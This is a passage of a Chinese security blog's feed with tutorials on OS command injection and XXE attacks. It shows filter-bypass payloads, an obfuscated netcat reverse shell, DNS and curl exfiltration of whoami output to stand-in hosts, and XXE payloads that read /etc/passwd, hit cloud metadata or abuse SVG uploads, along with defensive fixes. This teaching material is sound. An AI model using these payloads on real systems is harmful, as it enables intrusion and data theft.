title="通过时间延迟检测盲操作系统命令注入"></a>通过时间延迟检测盲操作系统命令注入</h5><p>使用触发时间延迟的诸如命令，根据程序向响应包时间来确认命令已经执行，例如使用<strong>ping</strong>命令,<code>ping -c 10 127.0.0.1 &amp;</code>。</p><h5 id="通过输出重定向利用命令注入"><a href="#通过输出重定向利用命令注入" class="headerlink" title="通过输出重定向利用命令注入"></a>通过输出重定向利用命令注入</h5><p>将注入命令的输出重定向到 <strong>Web</strong> 根目录中的文件中，然后使用浏览器检索该文件。例如，如果应用程序从文件系统位置提供静态资源<code>/var/www/static</code>，那么提交以下输入：<code>&amp; whoami &gt; /var/www/static/whoami.txt &amp;</code>。</p><h5 id="通过OAST技术利用命令注入"><a href="#通过OAST技术利用命令注入" class="headerlink" title="通过OAST技术利用命令注入"></a>通过OAST技术利用命令注入</h5><p>通过使用 OAST 技术触发系统与外部网络发生交互。例如：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp; nslookup kgji2ohoyw.web-attacker.com &amp;</span><br></pre></td></tr></table></figure><p><code>nslookup</code>命令对指定域进行 DNS 查找。攻击者可以监视指定的查找发生，从而检测到命令已成功注入。</p><p><strong>OAST参考：</strong><a href="https://portswigger.net/burp/application-security-testing/oast">https://portswigger.net/burp/application-security-testing/oast</a></p><h4 id="0x03-绕过"><a href="#0x03-绕过" class="headerlink" title="0x03 绕过"></a>0x03 绕过</h4><h5 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h5><ul><li><p>${IFS}绕过</p><p>**${IFS}**是 <strong>shell</strong> 的特殊环境变量，是 <strong>Linux</strong> 下的内部域分隔符。${IFS} 中存储的值可以是空格、制表符、换行符或者其它自定符号，可以使用 ${IFS} 来绕过空格。</p><p><code>exec.php?ip=127.0.0.1;cat$&#123;IFS&#125;exec.php</code></p></li><li><p>$IFS$9绕过</p><p><code>exec.php?ip=127.0.0.1;cat$IFS$9exec.php</code></p></li><li><p><strong>制表符绕过</strong></p><p><strong>%09</strong>是制表符的URL编码，可以通过 %09 来代替空格绕过空格过滤。</p><p><code>exec.php?ip=127.0.0.1;cat%09exec.php</code></p></li><li><p>{}绕过</p><p><code>exec.php?ip=127.0.0.1;&#123;cat,exec.php&#125;</code></p></li><li><p><strong>&lt;绕过</strong></p><p><code>cat&lt;exec.php</code></p></li></ul><h5 id="绕过关键字过滤"><a href="#绕过关键字过滤" class="headerlink" title="绕过关键字过滤"></a>绕过关键字过滤</h5><ul><li><p>变量拼接绕过</p><p>Linux支持变量赋值，可以通过变量拼接来绕过过滤规则。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#a=c;b=cat;$a$b exec.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ip</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;IP&#x27;</span>]</span><br><span class="line">system(<span class="string">&quot;ping -c 3 &quot;</span>.<span class="variable">$IP</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>空变量绕过</p><p><code>ca$&#123;x&#125;t exec.php</code></p></li><li><p>系统变量绕过</p><p>${SHELLOPTS} 是系统变量，可以利用系统变量的字符拼接绕过过滤。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@virtual-machine:/# $&#123;SHELLOPTS&#125;</span><br><span class="line">braceexpand:emacs:hashall:histexpand:history:interactive-comments:monitor</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">$</span><span class="bash">&#123;SHELLOPTS:2:3&#125;at exec.php=cat exec.php</span></span><br></pre></td></tr></table></figure></li><li><p>\ 绕过</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">c\a\t exec.php</span><br></pre></td></tr></table></figure></li><li><p>通配符绕过</p><p><strong>Linux</strong>支持利用通配符进行字符匹配，通配符的作用是在模糊查询时表示文件名中某些不确定的字符。</p><p>通配符规则如下：</p><ul><li>*代表0到多个任意字符；</li><li>？代表任意一个字符；</li><li>[]内为字符范围，代表该字符范围中的任意一个字符。</li></ul><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//对于/etc/passwd文件过滤，可以利用通配符绕过</span><br><span class="line">  cat /???/???sw?</span><br></pre></td></tr></table></figure></li><li><p><strong>shell</strong>反弹绕过</p><p>在反弹shell时如果存在过滤，可以通过通配符来绕过过滤，执行系统命令。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//例如要执行该命令 /bin/nc 192.168.1.1 8888 -e /bin/bash</span><br><span class="line">首先将IP地址转换为十进制 3232235777 (也可转换为16进制)</span><br><span class="line">然后使用通配符替换关键字 /b??/?c 3232235777 8888 -e /???/b??h</span><br></pre></td></tr></table></figure></li><li><p><strong>Base64</strong>编码绕过</p><p>利用系统函数<strong>Base64</strong>对命令进行编码以绕过过滤。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">id的base64编码为aWQ=</span><br><span class="line">执行 &#x27;echo &quot;aWQ=&quot; | base64 -d&#x27; 即可执行id命令</span><br></pre></td></tr></table></figure></li><li><p><strong>expr</strong>和<strong>awk</strong>绕过</p><p>通过<strong>expr</strong>和<strong>awk</strong>命令从其他文件中获取字符并进行命令伪造。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">//test.txt文件中的内容为字符串 www.test.com,可以通过以下命令来获取字符串并进行命令构造。</span><br><span class="line">expr substr $(awk NR=1 test.txt) 1 1 </span><br><span class="line">//获得字符w</span><br></pre></td></tr></table></figure></li></ul><h5 id="无回显的命令执行"><a href="#无回显的命令执行" class="headerlink" title="无回显的命令执行"></a>无回显的命令执行</h5><p>若存在无回显的命令执行漏洞，可以通过<strong>shell</strong>反弹的方式将<strong>shell</strong>反弹到<strong>vps</strong>，然后通过<strong>vps</strong>执行命令。当无法反弹<strong>shell</strong>时也可以通过<strong>DNS</strong>管道解析的方式获取命令的执行结果。</p><p><strong>Linux</strong>中获取用户名</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">curl www.test.com/`whoami`</span><br><span class="line">ping -c 1 `whoami`.www.test.com</span><br></pre></td></tr></table></figure><p><strong>Windows</strong>中获取计算机名：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /F %x in (&#x27;whoami&#x27;) do start http://www.test.com/%x</span><br></pre></td></tr></table></figure><p><strong>Windows</strong>中获取用户名：</p>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">for /F &quot;delims=\ token=2&quot; %i in (&#x27;whoami&#x27;) do ping -n 1 %i.www.test.com</span><br></pre></td></tr></table></figure><p><img src="/image/os-injection/2.png" alt="2"></p><p>  开源<strong>DNSLog</strong>：</p><ul><li><a href="http://ceye.io/">http://ceye.io</a></li><li><a href="https://github.io.com/BugScanTeam/DNSLog">https://github.io.com/BugScanTeam/DNSLog</a></li></ul><h4 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h4><h5 id="服务器配置修复"><a href="#服务器配置修复" class="headerlink" title="服务器配置修复"></a>服务器配置修复</h5><p>通过<strong>PHP</strong>配置文件中的disable_functions禁用敏感函数来修复漏洞。</p><h5 id="函数过滤"><a href="#函数过滤" class="headerlink" title="函数过滤"></a>函数过滤</h5><ul><li><p><strong>escapeshellarg</strong>函数</p><p>该函数把字符串转码为可以在<strong>shell</strong>命令里使用的参数，以过滤命令中的参数。该函数可以给字符串增加一个单引号，并且能引用或者转义任何已经存在的单引号，这样就可以直接讲一个字符串传入<strong>shell</strong>函数，并且可以确保它是安全的。</p></li><li><p><strong>escapeshellcmd</strong>函数</p><p>该函数可以对<strong>shell</strong>元字符进行转义，过滤命令，可以对字符串中可能会欺骗<strong>shell</strong>执行恶意命令的字符进行转义。此函数保证用户输入的数据在传送到<strong>system</strong>函数或者执行操作符之前被转义。</p><p><strong>escapeshellcmd</strong>函数会在以下字符之前插入反斜杠<code>\</code>：<code>&amp;、#、;、|、*、？、~、&lt;、&gt;、^、（、）、[、]、&#123;、&#125;、$、\、\x0A和\xFF</code>。在<strong>Windows</strong>平台中上面所有的字符以及**%<strong>和</strong>！**都会被空格和代替。</p></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-命令执行漏洞介绍&quot;&gt;&lt;a href=&quot;#0x01-命令执行漏洞介绍&quot; class=&quot;headerlink&quot; title=&quot;0x01 命令执行漏洞介绍&quot;&gt;&lt;/a&gt;0x01 命令执行漏洞介绍&lt;/h4&gt;&lt;p&gt;&lt;img src=&quot;/image/os-inject</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="命令注入" scheme="https://banana69.site/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>XXE注入方法</title>
    <link href="https://banana69.site/2019/09/24/XXE%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/"/>
    <id>https://banana69.site/2019/09/24/XXE%E6%B3%A8%E5%85%A5%E6%96%B9%E6%B3%95/</id>
    <published>2019-09-24T07:21:46.000Z</published>
    <updated>2021-10-17T12:36:09.760Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-XML-攻击原理"><a href="#0x01-XML-攻击原理" class="headerlink" title="0x01 XML 攻击原理"></a>0x01 XML 攻击原理</h4><h6 id="①-XML介绍："><a href="#①-XML介绍：" class="headerlink" title="① XML介绍："></a>① XML介绍：</h6><ul><li><p><strong>XML</strong>实体：</p><p><strong>XML</strong>是一种被设计用于存储和传输数据的”可扩展标记语言”，且XML使用标签和数据的树状结构，XML不需要使用预定义标签。</p><p><strong>XML</strong>实体是在<strong>XML</strong>文档中表示数据项的一种方式，<strong>XML</strong>在语言规范中内置了很多实体。例如**&amp;lt<strong>表示</strong>&lt;**,**&amp;gt**表示**&gt;**。所以当这些字符出现在数据中时一般需要使用它们的实体来表示。</p><p><img src="/image/XXE/2.png" alt="2"></p></li><li><p>文档类型定义：</p><p><strong>XML</strong>文档类型定义**(document type definition ，DTD)<strong>包含的声明可以定义</strong>XML<strong>文档的结构。</strong>DTD<strong>可以独立于文档本身（内部</strong>DTD**），也可以从外部加载（外部DTD）。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>自定义实体与外部实体：</p><p><strong>XML</strong>允许在<strong>DTD</strong>中自定义实体，如<code>&lt;!DOCTYPE foo [ &lt;!ENTITY myentity &quot;my entity value&quot; &gt; ]&gt;</code>，意味着XML文档中任何引用&amp;myextity实体的值都会被替换为”my entity value”。</p><p><strong>XML</strong>外部实体也是一种自定义实体，但是其定义必须位于声明他们的<strong>DTD</strong>之外。外部实体使用<strong>SYSTEM</strong>关键字时，必须指定加载实体值的<strong>URL</strong>。例如，<code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;http://normal-website.com&quot; &gt; ]&gt;</code>，又因为URL可以使用file://协议，因此可以从文件中加载外部实体，例如，<code>&lt;!DOCTYPE foo [ &lt;!ENTITY ext SYSTEM &quot;file:///path/to/file&quot; &gt; ]&gt;</code>，所以XML外部实体提供了XML外部实体攻击的主要方法。</p><blockquote><p><em>内部实体声明语法</em><code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</code></p><p><em>外部实体声明语法</em><code>&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;</code></p></blockquote><h6 id="②-XML外部实体注入："><a href="#②-XML外部实体注入：" class="headerlink" title="② XML外部实体注入："></a>② XML外部实体注入：</h6></li></ul><p>​    <strong>XML</strong> 外部实体注入（也称为 <strong>XXE</strong>）是一种 <strong>Web</strong> 安全漏洞，允许攻击者干扰应用程序对 <strong>XML</strong> 数据的处理。它通常允许攻击者查看应用程序服务器文件系统上的文件，并与应用程序本身可以访问的任何后端或外部系统进行交互。</p><p><img src="/image/XXE/1.png" alt="1"></p><p>一些应用程序使用 <strong>XML</strong> 格式在浏览器和服务器之间传输数据。执行此操作的应用程序实际上总是使用标准库或平台 <strong>API</strong> 来处理服务器上的 <strong>XML</strong> 数据。<strong>XXE</strong> 漏洞的出现是因为 <strong>XML</strong> 规范包含各种潜在的危险特性，标准解析器支持这些特性，即使它们通常不被应用程序使用。</p><h4 id="0x02-XXE-攻击类型"><a href="#0x02-XXE-攻击类型" class="headerlink" title="0x02 XXE 攻击类型"></a>0x02 XXE 攻击类型</h4><ul><li><p>利用<strong>XXE</strong>读取（检索）<strong>files</strong>：</p><p>定义一个包含文件内容的外部实体，并在应用程序的响应中返回，如上图所示。</p></li><li><p>利用<strong>XXE</strong>执行<strong>SSRF</strong>攻击：</p><p>根据后端系统的 URL 定义外部实体。</p></li><li><p>利用盲<strong>XXE</strong>（无回显）造成数据泄露：</p><p>敏感数据从应用服务器传输到攻击者控制的系统。</p></li><li><p>利用盲<strong>XXE</strong>通过错误消息检索数据：</p><p>攻击者可以在其中触发包含敏感数据的解析错误消息。</p></li></ul><h4 id="0x03-XXE-攻击实验"><a href="#0x03-XXE-攻击实验" class="headerlink" title="0x03 XXE 攻击实验"></a>0x03 XXE 攻击实验</h4><h6 id="①-利用XXE检索文件"><a href="#①-利用XXE检索文件" class="headerlink" title="① 利用XXE检索文件"></a>① 利用XXE检索文件</h6><p><strong>XXE-Labs</strong>的环境比较简单，下边是源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);<span class="comment">//这里面因为没有xml文档所以用的是php的伪协议来获取我们发送的xml文档</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();<span class="comment">//创建XML的对象</span></span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<span class="comment">//将我们发送的字符串生成xml文档。</span></span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);<span class="comment">//这一步感觉相当于实例化xml文档</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;<span class="comment">//获取username标签的值</span></span><br><span class="line">    <span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;<span class="comment">//获取password标签的值</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;<span class="comment">//将获取的值与前面的进行比较。...</span></span><br><span class="line">        <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);<span class="comment">//注意必须要有username这个标签，不然的话找不到username,就没有了输出了，我们也不能通过回显来获取信息了</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);<span class="comment">//与上方相同，都会输出username的值，都可以达到我们的目的</span></span><br><span class="line">    &#125;    </span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;getMessage());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>该环境只需要使用<strong>Burp</strong>抓包后在发送数据时构造外部实体定义即可完成，在执行<strong>XXE</strong>攻击时需要在将<strong>username</strong>替换为对外部实体的引用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY ent SYSTEM  &quot;file:///c:/windows/win.ini&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p><img src="/image/XXE/3.png" alt="3"></p><h6 id="②-利用XXE进行SSRF攻击"><a href="#②-利用XXE进行SSRF攻击" class="headerlink" title="② 利用XXE进行SSRF攻击"></a>② 利用XXE进行SSRF攻击</h6><p>实验环境：<a href="https://portswigger.net/web-security/xxe">https://portswigger.net/web-security/xxe</a></p><p>构造外部实体</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [</span><br><span class="line">&lt;!ENTITY ent SYSTEM  &quot;http://169.254.169.254/&quot;&gt;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>将<code>productId</code>数字替换为对外部实体的引用：<code>&amp;ent</code>即可利用XXE漏洞来执行SSRF攻击。</p><p>  <img src="/image/XXE/4.png" alt="4"></p><p>在<strong>Response</strong>中可以看到返回值为<code>Invalid product ID latest</code>，继续尝试访问<code>latest</code>目录，查看相应的返回值最后完成该实验，实现了利用<strong>XXE</strong>进行<strong>SSRF</strong>攻击。</p><p><img src="/image/XXE/5.png" alt="5"></p><h6 id="③-通过XInclude-进行XXE攻击"><a href="#③-通过XInclude-进行XXE攻击" class="headerlink" title="③ 通过XInclude 进行XXE攻击"></a>③ 通过XInclude 进行XXE攻击</h6><p>一些应用程序接收客户端提交的数据，在服务器端将其嵌入到 <strong>XML</strong> 文档中，然后解析该文档。当客户端提交的数据被放入后端 <strong>SOAP</strong> 请求，然后由后端 <strong>SOAP</strong> 服务处理时，就会发生这种情况。</p><p>在这种情况下由于无法控制整个 <strong>XML</strong> 文档，所以法执行经典的 <strong>XXE</strong> 攻击，因此无法定义或修改<code>DOCTYPE</code>元素。但是可以利用<strong>XInclude</strong>。</p><p><strong>XInclude</strong>是 <strong>XML</strong> 规范的一部分，它允许从子文档构建 <strong>XML</strong> 文档。因此<strong>XInclude</strong>可以在 <strong>XML</strong> 文档中的任何数据值中部署<strong>XInclude</strong>攻击，因此，攻击可以在仅控制放在服务器端XML文档中的单个数据项的情况下执行。要执行<strong>XInclude</strong>攻击，需要引用<strong>XInclude</strong>名称空间并提供希望包含的文件的路径。例如:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure><p>在该实验中，将<strong>productId</strong>的值改为构造的<strong>XInclude</strong>指令即可。</p><p><img src="/image/XXE/6.png" alt="6"></p><h6 id="④-通过文件上传的-XXE-攻击"><a href="#④-通过文件上传的-XXE-攻击" class="headerlink" title="④ 通过文件上传的 XXE 攻击"></a>④ 通过文件上传的 XXE 攻击</h6><p>有些应用程序允许用户上传文件，然后在服务器端处理这些文件。一些常见的文件格式使用<strong>XML</strong>或包含XML子组件。基于<strong>xml</strong>的格式的例子有<strong>DOCX</strong>这样的办公文档格式和<strong>SVG</strong>这样的图像格式。</p><p>例如，应用程序可能允许用户上传图像，并在上传后在服务器上处理或验证这些图像。即使应用程序希望接收<strong>PNG</strong>或<strong>JPEG</strong>这样的格式，所使用的图像处理库也可能支持<strong>SVG</strong>图像。由于<strong>SVG</strong>格式使用<strong>XML</strong>，攻击者可以提交恶意<strong>SVG</strong>图像，从而达到针对<strong>XXE</strong>漏洞的隐藏攻击面。</p><p>该实验环境需要创建<strong>svg</strong>文件：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure><p>然后上传此svg图像，</p><p><img src="/image/XXE/7.png" alt="7"></p><p>然后在查看评论时会在头像中看到<code>/etc/hostname</code>的内容</p><p><img src="/image/XXE/8.png" alt="8"></p><h6 id="⑤-无回显-XXE-通过错误消息检索数据"><a href="#⑤-无回显-XXE-通过错误消息检索数据" class="headerlink" title="⑤ 无回显 XXE 通过错误消息检索数据"></a>⑤ 无回显 XXE 通过错误消息检索数据</h6><p>利用无回显的一种方法是触发一个<strong>XML</strong>解析错误,其中错误消息包含检索的敏感数据。如果应用程序在其响应中返回错误消息，这将是有效的。</p><p>可以使用恶意的外部<strong>DTD</strong>触发包含**/etc/passwd**文件内容的XML解析错误消息，如下所示:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///nonexistent/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure><p>该<strong>DTD</strong>的执行步骤为：</p><ul><li>定义一个称为<strong>file</strong>的<strong>XML</strong>参数实体，包含 /etc/passwd 文件的内容。</li></ul><ul><li>定义一个名为<strong>eval</strong>的<strong>XML</strong>参数实体，其中包含名为<strong>error</strong>的另一个<strong>XML</strong>参数实体的动态声明。通过加载一个名称包含文件实体值的不存在的文件来评估错误实体。</li></ul><ul><li>使用<strong>eval</strong>实体，它会执行错误实体的动态声明。</li></ul><ul><li>使用<strong>error</strong>实体，以便通过尝试加载不存在的文件来评估它的值，从而导致包含不存在文件的名称(即 /etc/passwd 文件的内容)的错误消息。</li></ul><p>在此次实验中，需要用到的<strong>DTD</strong>为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % eval &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#x27;file:///invalid/%file;&#x27;&gt;&quot;&gt;</span><br><span class="line">%eval;</span><br><span class="line">%exfil;</span><br><span class="line">/etc/passwdfile</span><br></pre></td></tr></table></figure><p>首先在实验室环境中的<code>Go to exploit server</code>处上传<strong>DTD</strong>生成一个恶意的<strong>URL</strong></p><p>然后在<code>check stock</code>功能处插入外部实体即可完成<strong>XXE</strong>攻击。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM &quot;YOUR-DTD-URL&quot;&gt; %xxe;]&gt;`</span><br><span class="line">`/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="/image/XXE/9.png" alt="9"></p><h4 id="0x04-XXE-攻击预防"><a href="#0x04-XXE-攻击预防" class="headerlink" title="0x04 XXE 攻击预防"></a>0x04 XXE 攻击预防</h4><p>几乎所有<strong>XXE</strong>漏洞的出现都是因为应用程序的<strong>XML</strong>解析库支持应用程序不需要或不打算使用的潜在危险的<strong>XML</strong>特性。防止<strong>XXE</strong>攻击的最简单和最有效的方法是禁用这些特性。通常，只要禁用外部实体的解析和禁用对<strong>XInclude</strong>的支持就足够了。可以通过配置选项或通过编程覆盖默认行为来实现。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;0x01-XML-攻击原理&quot;&gt;&lt;a href=&quot;#0x01-XML-攻击原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 XML 攻击原理&quot;&gt;&lt;/a&gt;0x01 XML 攻击原理&lt;/h4&gt;&lt;h6 id=&quot;①-XML介绍：&quot;&gt;&lt;a href=&quot;#①</summary>
      
    
    
    
    <category term="Web" scheme="https://banana69.site/categories/Web/"/>
    
    
    <category term="XXE" scheme="https://banana69.site/tags/XXE/"/>
    
  </entry>
  
</feed>
